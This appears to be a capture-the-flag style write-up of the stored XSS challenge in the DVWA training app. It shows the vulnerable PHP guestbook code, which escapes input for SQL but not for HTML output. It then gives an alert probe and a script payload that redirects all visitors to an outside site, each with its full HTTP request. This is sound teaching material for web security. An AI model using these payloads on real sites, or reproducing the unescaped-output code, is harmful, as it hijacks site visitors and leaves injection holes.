@@ -1,0 +1,96 @@
+#+TITLE: DVWA - XSS Stored Low
+#+AUTHOR: Leonardo Tamiano
+
+* Goal
+  The goal is to redirect everyone to a web page of your choosing.
+  
+* Description
+  We're presented with a form that allows us to insert two
+  information, a ~name~ and a ~message~.
+
+  The code is the following one
+
+  #+begin_src php
+<?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    // Get input
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Sanitize name input
+    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Update database
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    //mysql_close();
+}
+
+?>
+  #+end_src
+  
+* Solution
+  As we can see from the code, there's a lot of sanitization when it
+  comes to interacting with the SQL database, but there's no
+  sanitization when it comes to XSS.
+
+  This means we can use the following payload
+
+  #+begin_src html
+<script> alert(1); </script>
+  #+end_src
+
+  which is sent in the following HTTP request
+  
+  #+begin_example
+POST /vulnerabilities/xss_s/ HTTP/1.1
+Host: evil
+Content-Length: 89
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Origin: http://evil
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_s/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=6jfjn0keu8uc3cijtk2hs3a505; security=low
+Connection: close
+
+txtName=hi&mtxMessage=%3Cscript%3E+alert%281%29%3B+%3C%2Fscript%3E&btnSign=Sign+Guestbook
+  #+end_example
+
+  If we're interested in redirecting the users of the website into
+  another site, the payload to use is the following 
+
+  #+begin_src html
+<script> window.location.replace("https://leonardotamiano.xyz"); </script>
+  #+end_src
+  
+  which is encoded in the following HTTP request
+
+  #+begin_example
+POST /vulnerabilities/xss_s/ HTTP/1.1
+Host: evil
+Content-Length: 123
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_s/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=6jfjn0keu8uc3cijtk2hs3a505; security=low
+Connection: close
+
+txtName=hi&mtxMessage=<script>+window.location.replace("https%3a//leonardotamiano.xyz")%3b+</script>&btnSign=Sign+Guestbook
+  #+end_example
